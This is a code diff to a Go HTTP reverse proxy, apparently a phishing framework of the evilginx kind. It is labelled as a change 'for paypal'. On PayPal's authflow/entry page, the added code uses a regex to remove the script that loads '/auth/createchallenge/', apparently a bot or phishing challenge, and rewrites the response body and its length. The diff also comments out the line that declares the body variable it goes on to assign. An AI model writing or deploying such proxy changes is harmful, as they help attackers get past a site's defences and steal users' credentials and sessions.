@@ -1124,8 +1124,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 
-			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			// modify received body(changes done for paypal
+			//body, err := ioutil.ReadAll(resp.Body)
+			// Read the original body of the response
+			bodyo, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+			    log.Debug("Failed to read response body: %v", err)
+			    return
+			}
+			
+			// Close the original response body and prepare to replace it
+			resp.Body.Close()
+			
+			// Check if the request path matches the target
+			if strings.Contains(resp.Request.URL.Path, "authflow/entry") {
+			    // Regex to match and remove the <script async src="/auth/createchallenge/..." tag
+			    scriptRegex := regexp.MustCompile(`<script\s+async[^>]*src="/auth/createchallenge/[^"]*".*?</script>`)
+			    body = scriptRegex.ReplaceAll(bodyo, []byte(""))
+			} else {
+			    // If the path doesn't match, use the original body
+			    body = bodyo
+			}
+			
+			// Set the (potentially modified) body back to the response
+			resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+			resp.ContentLength = int64(len(body))
+			resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
